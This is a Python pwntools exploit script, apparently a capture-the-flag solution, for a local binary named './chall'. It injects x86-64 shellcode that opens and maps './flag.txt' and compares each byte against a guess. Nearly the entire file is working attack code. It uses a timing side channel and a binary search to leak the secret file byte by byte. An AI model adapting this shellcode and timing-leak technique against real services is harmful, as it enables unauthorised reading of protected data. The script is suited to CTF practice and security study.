#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./chall')
context(arch = elf.arch, os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./chall")


def pwn(pos, char):
    shellcode_main = '''
        /* open("./flag.txt") */
        mov rdi, 0x7478
        push rdi
        mov rdi, 0x742e67616c662f2e
        push rdi
        mov rdi, rsp
        mov rsi, 0
        xor edx, edx
        mov rax, 2
        syscall

        /* mmap(0, 0x1000, 1, 1, 3, 0LL) */
        mov rdi, 0
        mov rsi, 0x1000
        mov rdx, 1
        mov r10, 1
        mov r8, 3
        mov r9, 0
        mov rax, 9
        syscall

        /* blow up flag */
        mov rsi, rax
        mov al, byte ptr[rsi+{}]
        cmp al, {}
        ja $-2
        ret
    '''.format(pos, char)
    sleep(0.05)
    se(asm(shellcode_main))


if __name__ == '__main__' :
    start = time.time()
    pos = 0
    flag = ""
    while True:
        left, right = 0, 256
        while left < right :
            mid = (left + right) >> 1
            p = process("./chall")
            # debug(0x1466)
            pwn(pos, mid)
            # p.interactive()
            s = time.time()
            print(str(left) + " -- " + str(right) + " -- " + str(mid))
            try:
                p.recv(timeout = 0.05)
                t = time.time()
                p.close()
                if t - s > 0.05 :
                    left = mid + 1
            except:
                right = mid
        flag += chr(left)
        info(flag)
        if chr(left) == '}' :
            break
        pos = pos + 1
    success(flag)
    end = time.time()
    success("time:\t" + str(end - start) + "s")
